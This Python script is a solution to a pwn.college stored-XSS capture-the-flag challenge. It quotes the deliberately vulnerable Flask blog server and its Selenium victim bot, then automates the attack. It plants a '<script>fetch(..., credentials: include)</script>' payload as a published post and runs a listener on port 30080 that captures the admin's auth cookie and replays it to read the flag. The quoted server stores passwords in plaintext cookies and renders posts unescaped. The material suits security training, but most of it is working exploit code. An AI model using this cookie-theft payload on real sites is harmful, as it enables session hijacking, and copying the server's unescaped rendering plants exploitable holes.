import os
import re
import requests
import sys
from flask import Flask, request


"""
Theory:
The class of vulnerabilities in which injections occur into client-side web data (such as HTML)
is called Cross Site Scripting, or XSS for short.
In a typical XSS exploit, an attacker will cause their own code to be injected into (typically)
the HTML produced by a web application and viewed by a victim user. This will then allow the
attacker to gain some control within the victim's browser, leading to a number of potential
downstream shenanigans.
You will now have a /challenge/victim program that simulates a victim user visiting the web server.

Note:
Initially xss attacks used to download the malicious scripts run as part of the attack from an
atacker controlled separate website. Hence these attack where called cross site scripting.

Stored xss:
Inspecting the target website, the attacker can see that the site allows to permanently insert
content posts into the websites database. The inserted content is then displayed as html text
in all future requests to the website. The attacker crafts a malicious script and inserts it
as content into the website. All users that visit the target website from now on will trigger
the attack.

Specific to this challenge:
We have to craft a request, that exposes the admin auth cookie to us. Afterwards we can simply
inspect it to get the flag, since the flag is set as the user password inside the cookie.
Alternatively we can use the cookie to make an admin request and display all posts including
admin draft posts. The draft posts also contain the flag.

Inspecting the auth cookie that is returned for the known hacker user and password,
we can see, that the cookie is only valid for the challenge.localhost domain.
We therefore have to set up our server on challenge.localhost and i.e. port 30080.
This way, the cookie will be sent with the request triggered by our malicious script, once
the visitor admin user loads the website.

The reason we can even send a http request cross origin to our new server at challenge.localhost:30080
is due to the same origin policy. The same origin policy allows us to send simple get, post and head
requests cross origin.
"""

'''
Server:
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag[-20:]])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")

@app.route("/login", methods=["POST"])
def challenge_login():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    response = flask.redirect("/")
    response.set_cookie('auth', username+"|"+password)
    return response

@app.route("/draft", methods=["POST"])
def challenge_draft():
    username, password = flask.request.cookies.get("auth", "|").split("|")
    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    if username == "admin":
        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")

    content = flask.request.form.get("content", "")
    # https://www.sqlite.org/lang_insert.html
    db.execute(
        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
        (content, username, bool(flask.request.form.get("publish")))
    )
    return flask.redirect("/")

@app.route("/publish", methods=["POST"])
def challenge_publish():
    username, password = flask.request.cookies.get("auth", "|").split("|")
    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    if username == "admin":
        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")

    # https://www.sqlite.org/lang_update.html
    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [username])
    return flask.redirect("/")

@app.route("/", methods=["GET"])
def challenge_get():
    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
    username, password = flask.request.cookies.get("auth", "|").split("|")
    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if user:
        page += """
            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <form action=publish method=post><input type=submit value="Publish All Drafts"></form><hr>
        """

        for post in db.execute("SELECT * FROM posts").fetchall():
            page += f"""<h2>Author: {post["author"]}</h2>"""
            if post["published"]:
                page += post["content"] + "<hr>\n"
            elif post["author"] == username:
                page += "<b>YOUR DRAFT POST:</b> " + post["content"] + "<hr>\n"
            else:
                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
    else:
        page += """
            <form action=login method=post>
              Username:<input type=text name=username>
              Password:<input type=text name=password>
              <input type=submit name=submit value=Login>
            </form><hr>
        """

    return page + "</body></html>"

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)

Victim:
#!/opt/pwn.college/python

import psutil
import urllib
import atexit
import time
import sys
import os

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

os.setuid(os.geteuid())
os.environ.clear()
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

options = FirefoxOptions()
options.add_argument("--headless")
service = FirefoxService(log_path="/dev/null")
browser = webdriver.Firefox(service=service, options=options)
atexit.register(browser.quit)

open_ports = { s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == 'LISTEN' }
if 80 not in open_ports:
    print("Service doesn't seem to be running?")
    sys.exit(1)
challenge_url = "http://challenge.localhost:80/"
flag = open("/flag").read().strip()

print(f"Visiting {challenge_url}")
browser.get(challenge_url)

print("Logging in as admin...")
browser.find_element(By.NAME, "username").send_keys("admin")
browser.find_element(By.NAME, "password").send_keys(flag[-20:])
browser.find_element(By.NAME, "submit").submit()

time.sleep(5)
print("Visited! Go check if the attack worked!")
'''

pat0 = re.compile(r".*Running on http://challenge.localhost:80\n")
r1, w1 = os.pipe()
pid = os.fork()

if pid == -1:
	print("Error fork.")
	exit(1)

if pid == 0:
	os.close(r1)

	os.dup2(w1, 1)
	os.close(w1)

	# stdout as stderr
	os.dup2(1, 2)

	os.execv("/challenge/server", ["/challenge/server"])
	print("Error execv.")
	exit(1)

os.close(w1)

read_file = os.fdopen(r1, "r")

while True:
	line = read_file.readline()
	print(line, end="")

	m = pat0.match(line)
	if m:
		url = "http://challenge.localhost:80/login"
		data = {"username": "hacker", "password": "1337"}
		resp = requests.post(url, data=data, allow_redirects=False)
		cookies = resp.cookies
		print(cookies)

		url = "http://challenge.localhost:80/draft"
		data = {"publish": "True", "content": '<script>fetch("http://challenge.localhost:30080/", {"method": "GET", "credentials": "include"});</script>'}
		resp = requests.post(url, data=data, cookies=cookies, allow_redirects=False)

		pid = os.fork()

		if pid == -1:
			print("Error fork.")
			exit(1)

		if pid == 0:
			app = Flask(__name__)

			@app.route("/")
			def get_flag():
				print(request.cookies)
				sys.stdout.flush()
				resp = requests.get("http://challenge.localhost:80/", cookies=request.cookies)
				print(resp.text)
				sys.stdout.flush()
				return f"{resp.text}"

			app.run("challenge.localhost", 30080, use_reloader=False)
			exit(1)

		pid = os.fork()

		if pid == -1:
			print("Error fork.")
			exit(1)

		if pid == 0:
			os.execv("/challenge/victim", ["/challenge/victim"])
			print("Error execv.")
			exit(1)
